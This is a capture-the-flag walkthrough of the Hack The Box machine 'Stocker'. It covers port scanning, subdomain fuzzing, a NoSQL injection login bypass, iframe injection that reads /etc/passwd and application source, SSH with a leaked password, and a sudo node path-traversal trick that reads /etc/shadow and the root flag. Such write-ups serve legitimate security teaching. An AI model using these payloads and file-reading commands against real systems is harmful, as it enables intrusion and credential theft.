# Box: Stocker
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 10.129.228.197 -v -p- -T4```

```
Nmap scan report for stocker.htb (10.129.228.197)
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 4EB67963EC58BC699F15F80BBE1D91CC
|_http-title: Stock - Coming Soon!
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-generator: Eleventy v2.0.0
Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 32.171 days (since Thu Sep 21 23:48:56 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   189.37 ms 10.10.14.1
2   189.55 ms stocker.htb (10.129.228.197)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 24 03:55:08 2023 -- 1 IP address (1 host up) scanned in 706.90 seconds
```
From our scan we have 2 open ports, port 22 and port 80. Our enumeration today will be focused on port 80




# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6a2b79b8-6952-4f43-8c0e-ac68df66a410)

Add the domain name ```stocker.htb``` to your ``/etc/hosts``` file.

We should be able to view the webpage now

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a70cdd08-d99d-4d0e-969e-03b8462c5942)

cool, we can now view the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3f45a4b6-05ed-4198-973b-7e81208ce94e)

I fuzzed for directories but didn't find anything useful.

Lets fuzz for subdomains using ```gobuster```

command:```gobuster vhost -u http://stocker.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/stocker]
└─$ gobuster vhost -u http://stocker.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
Progress: 19966 / 19967 (99.99%)
===============================================================
Finished
===============================================================
```

We can see the subdomain ```dev.stocker.htb```, add this to your ```/etc/hosts``` file and navigate to the subdomain

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/16046452-a7cb-4bc1-aa17-3ab186c9d8f9)

We have a login page. Checking wappalyzer I saw that the javascript framework being used for that subdomain is ```express```

The login form can be exploited to be bypassed using NoSQL and also by changing the "Content-Type" from ```application/x-www-form-urlencoded``` to ```application/json```

Lets capture the login request using burpsuite then we send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/02c24101-710e-4401-a45c-69aa5d689cec)

We'll be using the NoSQL payload

```json
{"username": {"$gt":""}, "password": {"$gt":""}}
```
This will help bypass the login page, after modifying the request you should have something like this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a21b25ae-bea1-4b29-b55d-6617398be11d)

Send the request, you should get a response like this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2e21fbe7-9a90-421a-a9cc-e9b04d0a3a19)

nice nice, now lets follow redirection

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d0e09393-92b8-4945-80aa-c4d97a41ee13)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ebd8e346-4cbb-480e-a632-3715addb5c13)

Smooth we are logged in. Lets view this response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/62e6172f-9fad-4212-b2e6-1c0349804c44)

smooth😎.

Now, how does this application work

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3f57b04e-1c9d-41e3-aded-1fd580e3eb65)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d8c8894c-6610-4eff-9497-365a55268a3f)

Lets add the cup to our basket

You should see this when you try to "view cart"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/68611398-e303-4046-9f99-d2b2fb1cbb24)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b63ea42b-a15f-46e6-87fd-0ee90b955ca8)

So, after submitting we get an "order id" and also the purchase order. Lets take a look at the purchase order

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/aae167ea-6452-4b6b-8dc0-536c59ad4cd8)

Take note of the url ```http://dev.stocker.htb/api/po/{orderid}```. We can also see the name of the purchaser from the above screenshot, ```angoose``` is the purchaser's name.

Lets repeat the ordering process again, but this time we'll capture the request using burpsuite and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2fb013f6-e0b5-483a-9d38-3106245f1f57)

Lets try to add a script that will read the ```/etc/passwd``` file,

```html
<iframe src=/etc/passwd height=500 width=500></iframe>
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/597dcdc1-8c6f-46d9-8905-4965940a6cb3)

We got the order id, lets view the purchase order here ```http://dev.stocker.htb/api/po/65373f42517120235afe321a```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f0ad5d97-c507-424a-9358-da82ba078f9e)

nice nice, we were able to read the ```/etc/passwd``` file. This is what we can ```iframe Injection```

"Iframe injection" refers to a type of web security vulnerability or attack where an attacker inserts an ```<iframe>``` element into a web page to load and display content from an external source, often controlled by the attacker. 

Earlier, when I was trying to bypass the login page, I caused a json error and it revealed the full path to the base folder where the Express application is on the file system

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/909260fe-f316-406e-99f8-e561d4eb12e8)

So the full path to the base folder is ```/var/www/dev```

Lets try to read the ```server.js``` file

```json
<iframe src=file:///var/www/dev/index.js height=1000px width=1000px></iframe>
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e67af4ec-175c-4f07-8251-e6e01e8bb17f)

Lets view the purchase order

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a9f76ff3-53e8-4e02-8be5-0ffdb13f4863)

We can see the password the web application uses to connect to the Mongo database. Since we have the username lets try to ssh into the server using the creds we found

username:```angoose```        password:```IHeardPassphrasesArePrettySecure```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e770b9cd-cfbd-4bef-9813-304a7299fe07)

We got user shell. Lets escalate our privileges




# Privilege Escalation

Running the command ```sudo -l```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cd11d7a4-daeb-4af3-9276-c612ef81f5e7)

Node executable can be ran by user angoose to escalate privileges

Lets create a javascript script that can help us read root files

We can use this javascript script to read the ```/etc/shadow``` file

```javascript
const fs = require('fs');

// Specify the file path
const filePath = '/etc/shadow';

// Read the file
fs.readFile(filePath, 'utf8', (err, data) => {
  if (err) {
    console.error('Error reading the file:', err);
  } else {
    console.log('File content:');
    console.log(data);
  }
});
```
save this in a file say "bankai.js"

command:```sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/bankai.js```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8d5ef4dd-412e-4a63-b1ce-b4fed26eae79)

The root hash is not crackable omor. I tried reading the private key ```/root/.ssh/id_rsa```, but it wasn't available on the server.

Lets just read the root flag, edit the ```bankai.js``` file, instead of ```/etc/shadow``` replace it with ```/root/root.txt```

command:```sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/bankai.js```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/012fb72a-7ac5-446a-baf6-3893b3f48bba)

cool stuff, we were able to read the "root.txt" file

We have successfully pwned this box😎


That will be all for today
<br><br>
[Back To Home](../../index.md)














